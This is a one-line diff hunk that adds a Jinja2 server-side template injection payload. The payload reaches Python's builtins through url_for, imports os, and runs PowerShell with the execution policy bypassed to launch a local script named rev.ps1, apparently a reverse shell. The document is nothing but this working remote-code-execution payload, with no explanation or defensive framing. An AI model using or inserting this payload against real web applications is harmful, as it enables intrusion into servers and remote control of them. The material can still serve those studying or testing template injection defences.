@@ -1,0 +1,1 @@
+{{ url_for.__globals__.__builtins__.__import__('os').popen('powershell -ExecutionPolicy Bypass -File C:\Temp\rev.ps1').read() }}
